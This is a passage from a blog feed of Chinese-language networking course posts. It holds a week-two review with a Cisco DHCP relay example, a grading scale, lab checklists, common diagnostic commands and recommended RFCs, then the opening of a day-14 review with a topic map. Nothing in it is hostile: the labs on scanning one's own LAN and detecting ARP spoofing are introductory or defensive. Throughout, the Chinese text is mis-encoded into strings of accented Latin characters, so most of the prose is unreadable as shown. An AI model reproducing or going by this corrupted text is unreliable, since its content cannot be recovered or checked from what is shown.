IPï¼ŒçŸ¥é“å®¢æˆ·ç«¯åœ¨å­ç½‘1</li><li>ä»å­ç½‘1çš„åœ°å€æ± åˆ†é…IP</li><li>æœåŠ¡å™¨å•æ’­å“åº”ç»™è·¯ç”±å™¨</li><li>è·¯ç”±å™¨è½¬å‘å“åº”ç»™å®¢æˆ·ç«¯</li></ol><p>é…ç½®ç¤ºä¾‹ï¼ˆCiscoï¼‰ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">interface</span> GigabitEthernet0/<span class="hljs-number">0</span><br> <span class="hljs-attribute">ip</span> address <span class="hljs-number">192.168.1.1</span> <span class="hljs-number">255.255.255.0</span><br> <span class="hljs-attribute">ip</span> helper-address <span class="hljs-number">192.168.2.100</span><br></code></pre></td></tr></table></figure></details><h3 id="è®¡åˆ†æ ‡å‡†">è®¡åˆ†æ ‡å‡†</h3><ul><li>90-100åˆ†ï¼šä¼˜ç§€ï¼Œå®Œå…¨æŒæ¡æœ¬å‘¨å†…å®¹</li><li>75-89åˆ†ï¼šè‰¯å¥½ï¼Œå¤§éƒ¨åˆ†çŸ¥è¯†ç‚¹å·²æŒæ¡</li><li>60-74åˆ†ï¼šåŠæ ¼ï¼ŒåŸºç¡€çŸ¥è¯†æŒæ¡ï¼Œéœ€åŠ å¼ºç»ƒä¹ </li><li>60åˆ†ä»¥ä¸‹ï¼šéœ€è¦é‡æ–°å­¦ä¹ æœ¬å‘¨å†…å®¹</li></ul><hr><h2 id="ğŸ“-å®è·µå»ºè®®">ğŸ“ å®è·µå»ºè®®</h2><h3 id="1-åŠ¨æ‰‹å®éªŒ">1. åŠ¨æ‰‹å®éªŒ</h3><p><strong>å¿…åšå®éªŒ</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">â–¡ ä½¿ç”¨ipconfig/ifconfigæŸ¥çœ‹æœ¬æœºç½‘ç»œé…ç½®<br>â–¡ è®¡ç®—è‡ªå·±æ‰€åœ¨ç½‘ç»œçš„å­ç½‘ä¿¡æ¯<br>â–¡ æŸ¥çœ‹å¹¶åˆ†æARPç¼“å­˜è¡¨<br>â–¡ ä½¿ç”¨nslookup/digæŸ¥è¯¢DNS<br>â–¡ é‡Šæ”¾å¹¶é‡æ–°è·å–DHCPåœ°å€<br>â–¡ æ‰«æå±€åŸŸç½‘å†…çš„æ´»è·ƒä¸»æœº<br></code></pre></td></tr></table></figure><p><strong>é€‰åšå®éªŒ</strong>ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">â–¡ æ­å»ºç®€å•çš„DHCPæœåŠ¡å™¨ï¼ˆè™šæ‹Ÿæœºï¼‰<br>â–¡ é…ç½®DNSæœåŠ¡å™¨ï¼ˆ<span class="hljs-keyword">bind9ï¼‰</span><br><span class="hljs-keyword"></span>â–¡ ä½¿ç”¨WiresharkæŠ“åŒ…åˆ†æDHCPè¿‡ç¨‹<br>â–¡ ç¼–å†™å­ç½‘åˆ’åˆ†è®¡ç®—å™¨<br>â–¡ å®ç°ç®€å•çš„ARPæ¬ºéª—æ£€æµ‹<br></code></pre></td></tr></table></figure><h3 id="2-å·¥å…·ä½¿ç”¨">2. å·¥å…·ä½¿ç”¨</h3><p><strong>å‘½ä»¤è¡Œå·¥å…·</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Windows</span><br>ipconfig /all          <span class="hljs-comment"># æŸ¥çœ‹è¯¦ç»†ç½‘ç»œé…ç½®</span><br>ipconfig /displaydns   <span class="hljs-comment"># æŸ¥çœ‹DNSç¼“å­˜</span><br>arp -a                 <span class="hljs-comment"># æŸ¥çœ‹ARPç¼“å­˜</span><br>nslookup www.baidu.com <span class="hljs-comment"># DNSæŸ¥è¯¢</span><br>netstat -an            <span class="hljs-comment"># æŸ¥çœ‹ç«¯å£çŠ¶æ€</span><br><br><span class="hljs-comment"># Linux/Mac</span><br>ifconfig / ip addr     <span class="hljs-comment"># æŸ¥çœ‹ç½‘ç»œé…ç½®</span><br>arp -n                 <span class="hljs-comment"># æŸ¥çœ‹ARPç¼“å­˜</span><br>dig www.baidu.com      <span class="hljs-comment"># DNSæŸ¥è¯¢</span><br>netstat -tuln          <span class="hljs-comment"># æŸ¥çœ‹ç›‘å¬ç«¯å£</span><br>ss -tuln               <span class="hljs-comment"># æ›´å¿«çš„ç«¯å£æŸ¥çœ‹</span><br></code></pre></td></tr></table></figure><p><strong>å›¾å½¢åŒ–å·¥å…·</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>Wiresharkï¼šæŠ“åŒ…åˆ†æ<br><span class="hljs-bullet">- </span>Advanced IP Scannerï¼šç½‘ç»œæ‰«æ<br><span class="hljs-bullet">- </span>Angry IP Scannerï¼šè·¨å¹³å°IPæ‰«æ<br><span class="hljs-bullet">- </span>Fiddlerï¼šHTTPæŠ“åŒ…<br></code></pre></td></tr></table></figure><h3 id="3-å»¶ä¼¸å­¦ä¹ ">3. å»¶ä¼¸å­¦ä¹ </h3><p><strong>æ¨èé˜…è¯»</strong>ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. RFC <span class="hljs-number">791</span>  - IPåè®®è§„èŒƒ<br><span class="hljs-attribute">2</span>. RFC <span class="hljs-number">826</span>  - ARPåè®®è§„èŒƒ<br><span class="hljs-attribute">3</span>. RFC <span class="hljs-number">1918</span> - ç§æœ‰IPåœ°å€åˆ†é…<br><span class="hljs-attribute">4</span>. RFC <span class="hljs-number">1035</span> - DNSåè®®è§„èŒƒ<br><span class="hljs-attribute">5</span>. RFC <span class="hljs-number">2131</span> - DHCPåè®®è§„èŒƒ<br><span class="hljs-attribute">6</span>. RFC <span class="hljs-number">4632</span> - CIDRåœ°å€åˆ†é…<br></code></pre></td></tr></table></figure><p><strong>æ¨èè§†é¢‘/è¯¾ç¨‹</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>Wiresharkç½‘ç»œåˆ†ææ•™ç¨‹<br><span class="hljs-bullet">- </span>å­ç½‘åˆ’åˆ†å®æˆ˜æ¼”ç»ƒ<br><span class="hljs-bullet">- </span>DNSæ·±å…¥è§£æ<br><span class="hljs-bullet">- </span>DHCPæœåŠ¡å™¨æ­å»º<br></code></pre></td></tr></table></figure><hr><h2 id="ğŸš€-ä¸‹å‘¨é¢„å‘Š">ğŸš€ ä¸‹å‘¨é¢„å‘Š</h2><p><strong>ç¬¬ä¸‰å‘¨ï¼šä¼ è¾“å±‚åè®®è¯¦è§£</strong></p><p>æˆ‘ä»¬å°†å­¦ä¹ ï¼š</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">Day 15</span><span class="hljs-punctuation">:</span> <span class="hljs-string">TCPåè®®åŸºç¡€</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">TCPæŠ¥æ–‡æ ¼å¼</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">TCPä¸‰æ¬¡æ¡æ‰‹</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">TCPå››æ¬¡æŒ¥æ‰‹</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">TCPçŠ¶æ€æœº</span><br><br><span class="hljs-attribute">Day 16</span><span class="hljs-punctuation">:</span> <span class="hljs-string">TCPå¯é ä¼ è¾“</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">åºåˆ—å·å’Œç¡®è®¤å·</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">æ»‘åŠ¨çª—å£æœºåˆ¶</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">æµé‡æ§åˆ¶</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">æ‹¥å¡æ§åˆ¶</span><br><br><span class="hljs-attribute">Day 17</span><span class="hljs-punctuation">:</span> <span class="hljs-string">UDPåè®®è¯¦è§£</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">UDPæŠ¥æ–‡æ ¼å¼</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">UDP vs TCPå¯¹æ¯”</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">UDPåº”ç”¨åœºæ™¯</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">UDPç¼–ç¨‹å®æˆ˜</span><br><br><span class="hljs-attribute">Day 18</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Socketç¼–ç¨‹è¿›é˜¶</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">éé˜»å¡Socket</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">Socketé€‰é¡¹è®¾ç½®</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">å¤šè·¯å¤ç”¨ï¼ˆselect/poll/epollï¼‰</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">å®æˆ˜ï¼šèŠå¤©å®¤æœåŠ¡å™¨</span><br><br><span class="hljs-attribute">Day 19</span><span class="hljs-punctuation">:</span> <span class="hljs-string">HTTPåè®®åŸºç¡€</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">HTTPè¯·æ±‚å’Œå“åº”</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">HTTPæ–¹æ³•ï¼ˆGET/POSTç­‰ï¼‰</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">HTTPçŠ¶æ€ç </span><br><span class="hljs-bullet">-</span> <span class="hljs-string">Cookieå’ŒSession</span><br><br><span class="hljs-attribute">Day 20</span><span class="hljs-punctuation">:</span> <span class="hljs-string">HTTPSä¸å®‰å…¨</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">HTTPSå·¥ä½œåŸç†</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">SSL/TLSæ¡æ‰‹</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">è¯ä¹¦éªŒè¯</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">ä¸­é—´äººæ”»å‡»é˜²æŠ¤</span><br><br><span class="hljs-attribute">Day 21</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ç¬¬ä¸‰å‘¨æ€»ç»“</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">ä¼ è¾“å±‚åè®®ç»¼åˆå¤ä¹ </span><br><span class="hljs-bullet">-</span> <span class="hljs-string">TCP/UDPæ·±å…¥å¯¹æ¯”</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">ç»¼åˆå®æˆ˜é¡¹ç›®</span><br></code></pre></td></tr></table></figure><hr><h2 id="ğŸ“Š-å­¦ä¹ è¿›åº¦è¿½è¸ª">ğŸ“Š å­¦ä¹ è¿›åº¦è¿½è¸ª</h2><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arcade">ç¬¬ä¸€å‘¨ âœ… ç½‘ç»œåŸºç¡€å…¥é—¨<br>â”œâ”€ <span class="hljs-built_in">Day</span> <span class="hljs-number">1</span><span class="hljs-number">-7</span> å®Œæˆ âœ…<br>â””â”€ å‘¨æ€»ç»“å®Œæˆ âœ…<br><br>ç¬¬äºŒå‘¨ âœ… ç½‘ç»œå±‚æ·±å…¥<br>â”œâ”€ <span class="hljs-built_in">Day</span> <span class="hljs-number">8</span>:  IPåœ°å€è¯¦è§£ âœ…<br>â”œâ”€ <span class="hljs-built_in">Day</span> <span class="hljs-number">9</span>:  å­ç½‘åˆ’åˆ† âœ…<br>â”œâ”€ <span class="hljs-built_in">Day</span> <span class="hljs-number">10</span>: MACä¸ARP âœ…<br>â”œâ”€ <span class="hljs-built_in">Day</span> <span class="hljs-number">11</span>: ç«¯å£ä¸Socket âœ…<br>â”œâ”€ <span class="hljs-built_in">Day</span> <span class="hljs-number">12</span>: DNSåè®® âœ…<br>â”œâ”€ <span class="hljs-built_in">Day</span> <span class="hljs-number">13</span>: DHCPåè®® âœ…<br>â””â”€ <span class="hljs-built_in">Day</span> <span class="hljs-number">14</span>: å‘¨æ€»ç»“ âœ…<br><br>ç¬¬ä¸‰å‘¨ â³ ä¼ è¾“å±‚åè®®<br>â””â”€ <span class="hljs-built_in">Day</span> <span class="hljs-number">15</span><span class="hljs-number">-21</span> å¾…å­¦ä¹ <br><br>æ€»è¿›åº¦ï¼š<span class="hljs-number">14</span>/<span class="hljs-number">180</span> å¤© (<span class="hljs-number">7.8</span>%)<br></code></pre></td></tr></table></figure><hr><h2 id="âœ…-æœ¬å‘¨æ£€æŸ¥æ¸…å•">âœ… æœ¬å‘¨æ£€æŸ¥æ¸…å•</h2><p>åœ¨è¿›å…¥ä¸‹ä¸€å‘¨ä¹‹å‰ï¼Œè¯·ç¡®ä¿ï¼š</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs armasm">â–¡ ç†è§£<span class="hljs-built_in">IP</span>åœ°å€åˆ†ç±»å’Œç§æœ‰<span class="hljs-built_in">IP</span>èŒƒå›´<br>â–¡ èƒ½å¤Ÿè®¡ç®—å­ç½‘æ©ç å’ŒCIDR<br>â–¡ æŒæ¡å­ç½‘åˆ’åˆ†çš„æ–¹æ³•<br>â–¡ ç†è§£MACåœ°å€ç»“æ„å’ŒOUI<br>â–¡ æŒæ¡ARPå·¥ä½œåŸç†<br>â–¡ ç†Ÿæ‚‰å¸¸ç”¨ç«¯å£å·<br>â–¡ ç†è§£Socketç¼–ç¨‹åŸºç¡€<br>â–¡ æŒæ¡DNSæŸ¥è¯¢æµç¨‹<br>â–¡ ç†è§£DNSè®°å½•ç±»å‹<br>â–¡ æŒæ¡DHCP DORAè¿‡ç¨‹<br>â–¡ ç†è§£ç§Ÿçº¦ç®¡ç†æœºåˆ¶<br>â–¡ å®Œæˆæœ¬å‘¨æ‰€æœ‰ä»£ç ç»ƒä¹ <br>â–¡ èƒ½å¤Ÿä½¿ç”¨åŸºæœ¬çš„ç½‘ç»œè¯Šæ–­å‘½ä»¤<br></code></pre></td></tr></table></figure><hr><h2 id="ğŸ’¬-å­¦ä¹ å¿ƒå¾—">ğŸ’¬ å­¦ä¹ å¿ƒå¾—</h2><p>åœ¨è¿™é‡Œè®°å½•ä½ çš„å­¦ä¹ æ”¶è·å’Œç–‘é—®ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs markdown">æœ¬å‘¨æœ€å¤§æ”¶è·ï¼š<br><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span>_<br><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span>_<br><br>è¿˜ä¸å¤ªç†è§£çš„åœ°æ–¹ï¼š<br><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span>_<br><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span>_<br><br>ä¸‹å‘¨å­¦ä¹ è®¡åˆ’ï¼š<br><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span>_<br><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-emphasis">_</span><br></code></pre></td></tr></table></figure><hr><h2 id="ğŸ‰-æ€»ç»“">ğŸ‰ æ€»ç»“</h2><p>æ­å–œä½ å®Œæˆç¬¬äºŒå‘¨çš„å­¦ä¹ ï¼è¿™ä¸€å‘¨æˆ‘ä»¬æ·±å…¥å­¦ä¹ äº†ç½‘ç»œå±‚çš„æ ¸å¿ƒæ¦‚å¿µï¼š</p><ul><li>âœ… æŒæ¡äº†IPåœ°å€ä½“ç³»å’Œå­ç½‘åˆ’åˆ†</li><li>âœ… ç†è§£äº†MACåœ°å€å’ŒARPåè®®</li><li>âœ… å­¦ä¼šäº†ç«¯å£å’ŒSocketç¼–ç¨‹</li><li>âœ… æ·±å…¥äº†è§£DNSå’ŒDHCPåè®®</li><li>âœ… ç¼–å†™äº†å¤šä¸ªå®ç”¨çš„ç½‘ç»œå·¥å…·</li></ul><p>è¿™äº›çŸ¥è¯†æ˜¯ç½‘ç»œå·¥ç¨‹å¸ˆçš„å¿…å¤‡åŸºç¡€ã€‚åœ¨å®é™…å·¥ä½œä¸­ï¼Œä½ ä¼šé¢‘ç¹åœ°ä½¿ç”¨è¿™äº›æ¦‚å¿µæ¥ï¼š</p><ul><li>è§„åˆ’å’Œåˆ†é…IPåœ°å€</li><li>æ’æŸ¥ç½‘ç»œè¿é€šæ€§é—®é¢˜</li><li>é…ç½®ç½‘ç»œæœåŠ¡</li><li>å¼€å‘ç½‘ç»œåº”ç”¨</li></ul><p><strong>ç»§ç»­ä¿æŒå­¦ä¹ çš„çƒ­æƒ…ï¼Œæˆ‘ä»¬ä¸‹å‘¨è§ï¼</strong> ğŸš€</p><hr><p><strong>è®°ä½</strong>ï¼šç½‘ç»œçŸ¥è¯†éœ€è¦å¤§é‡å®è·µæ‰èƒ½çœŸæ­£æŒæ¡ã€‚å¤šåŠ¨æ‰‹ã€å¤šå®éªŒã€å¤šæ€è€ƒï¼</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>14å¤©ï¼šç¬¬ä¸€é˜¶æ®µæ€»ç»“ä¸ç»¼åˆå®æˆ˜</title>
    <link href="/2025/11/10/14%E5%A4%A9%EF%BC%9A%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93%E4%B8%8E%E7%BB%BC%E5%90%88%E5%AE%9E%E6%88%98/"/>
    <url>/2025/11/10/14%E5%A4%A9%EF%BC%9A%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93%E4%B8%8E%E7%BB%BC%E5%90%88%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<h1>ç¬¬14å¤©ï¼šç¬¬ä¸€é˜¶æ®µæ€»ç»“ä¸ç»¼åˆå®æˆ˜</h1><blockquote><p>â€œå‰ä¸¤å‘¨çš„å­¦ä¹ ä¸ºä½ æ‰“å¼€äº†ç½‘ç»œä¸–ç•Œçš„å¤§é—¨ï¼Œç°åœ¨æ˜¯æ—¶å€™æ£€éªŒå­¦ä¹ æˆæœäº†ï¼â€</p></blockquote><h2 id="ğŸ“š-ä»Šæ—¥ç›®æ ‡">ğŸ“š ä»Šæ—¥ç›®æ ‡</h2><ul><li>å›é¡¾ç¬¬ä¸€é˜¶æ®µæ ¸å¿ƒçŸ¥è¯†ç‚¹</li><li>å®Œæˆç»¼åˆå®æˆ˜é¡¹ç›®</li><li>æŒæ¡ç½‘ç»œé—®é¢˜æ’æŸ¥æ–¹æ³•</li><li>ä¸ºä¸‹ä¸€é˜¶æ®µåšå¥½å‡†å¤‡</li></ul><hr><h2 id="1-ç¬¬ä¸€é˜¶æ®µå­¦ä¹ å›é¡¾ï¼ˆDay-1-13ï¼‰">1. ç¬¬ä¸€é˜¶æ®µå­¦ä¹ å›é¡¾ï¼ˆDay 1-13ï¼‰</h2><h3 id="1-1-çŸ¥è¯†åœ°å›¾">1.1 çŸ¥è¯†åœ°å›¾</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">ç¬¬ä¸€é˜¶æ®µï¼šç½‘ç»œåŸºç¡€å…¥é—¨</span><br><span class="hljs-attribute">â”‚</span><br><span class="hljs-attribute">â”œâ”€â”€ ç¬¬1å‘¨ï¼šç½‘ç»œåŸºç¡€æ¦‚å¿µ</span><br><span class="hljs-attribute">â”‚   â”œâ”€â”€ Day 1</span><span class="hljs-punctuation">:</span> <span class="hljs-string">è®¡ç®—æœºç½‘ç»œæ¦‚è¿°</span><br><span class="hljs-attribute">â”‚   â”‚   â”œâ”€â”€ ä»€ä¹ˆæ˜¯è®¡ç®—æœºç½‘ç»œ</span><br><span class="hljs-attribute">â”‚   â”‚   â”œâ”€â”€ ç½‘ç»œçš„ä½œç”¨</span><br><span class="hljs-attribute">â”‚   â”‚   â””â”€â”€ ç½‘ç»œè¿æ¥æ£€æµ‹å·¥å…·</span><br><span class="hljs-attribute">â”‚   â”‚</span><br><span class="hljs-attribute">â”‚   â”œâ”€â”€ Day 2</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ç½‘ç»œåˆ†ç±»å’Œæ‹“æ‰‘</span><br><span class="hljs-attribute">â”‚   â”‚   â”œâ”€â”€ LAN/WAN/MAN</span><br><span class="hljs-attribute">â”‚   â”‚   â”œâ”€â”€ äº”ç§æ‹“æ‰‘ç»“æ„</span><br><span class="hljs-attribute">â”‚   â”‚   â””â”€â”€ å±€åŸŸç½‘æ‰«æå™¨</span><br><span class="hljs-attribute">â”‚   â”‚</span><br><span class="hljs-attribute">â”‚   â”œâ”€â”€ Day 3</span><span class="hljs-punctuation">:</span> <span class="hljs-string">OSIä¸ƒå±‚æ¨¡å‹</span><br><span class="hljs-attribute">â”‚   â”‚   â”œâ”€â”€ ä¸ƒå±‚æ¨¡å‹è¯¦è§£</span><br><span class="hljs-attribute">â”‚   â”‚   â”œâ”€â”€ æ•°æ®å°è£…è¿‡ç¨‹</span><br><span class="hljs-attribute">â”‚   â”‚   â””â”€â”€ åè®®åˆ†å±‚æ¼”ç¤º</span><br><span class="hljs-attribute">â”‚   â”‚</span><br><span class="hljs-attribute">â”‚   â”œâ”€â”€ Day 4</span><span class="hljs-punctuation">:</span> <span class="hljs-string">TCP/IPå››å±‚æ¨¡å‹</span><br><span class="hljs-attribute">â”‚   â”‚   â”œâ”€â”€ TCP/IP vs OSI</span><br><span class="hljs-attribute">â”‚   â”‚   â”œâ”€â”€ å››å±‚æ¨¡å‹è¯¦è§£</span><br><span class="hljs-attribute">â”‚   â”‚   â””â”€â”€ æ•°æ®åŒ…åˆ†æ</span><br><span class="hljs-attribute">â”‚   â”‚</span><br><span class="hljs-attribute">â”‚   â”œâ”€â”€ Day 5</span><span class="hljs-punctuation">:</span> <span class="hljs-string">pingå‘½ä»¤</span><br><span class="hljs-attribute">â”‚   â”‚   â”œâ”€â”€ pingåŸç†</span><br><span class="hljs-attribute">â”‚   â”‚   â”œâ”€â”€ ICMPåè®®</span><br><span class="hljs-attribute">â”‚   â”‚   â””â”€â”€ ç®€æ˜“pingå·¥å…·</span><br><span class="hljs-attribute">â”‚   â”‚</span><br><span class="hljs-attribute">â”‚   â”œâ”€â”€ Day 6</span><span class="hljs-punctuation">:</span> <span class="hljs-string">tracerouteå‘½ä»¤</span><br><span class="hljs-attribute">â”‚   â”‚   â”œâ”€â”€ tracerouteåŸç†</span><br><span class="hljs-attribute">â”‚   â”‚   â”œâ”€â”€ TTLå­—æ®µ</span><br><span class="hljs-attribute">â”‚   â”‚   â””â”€â”€ tracerouteå·¥å…·</span><br><span class="hljs-attribute">â”‚   â”‚</span><br><span class="hljs-attribute">â”‚   â””â”€â”€ Day 7</span><span class="hljs-punctuation">:</span> <span class="hljs-string">WiresharkæŠ“åŒ…</span><br><span class="hljs-attribute">â”‚       â”œâ”€â”€ WiresharkåŸºç¡€</span><br><span class="hljs-attribute">â”‚       â”œâ”€â”€ è¿‡æ»¤å™¨è¯­æ³•</span><br><span class="hljs-attribute">â”‚       â””â”€â”€ HTTPè¯·æ±‚åˆ†æ</span><br><span class="hljs-attribute">â”‚</span><br><span class="hljs-attribute">â””â”€â”€ ç¬¬2å‘¨ï¼šç½‘ç»œå±‚æ·±å…¥ç†è§£</span><br><span class="hljs-attribute">    â”œâ”€â”€ Day 8</span><span class="hljs-punctuation">:</span> <span 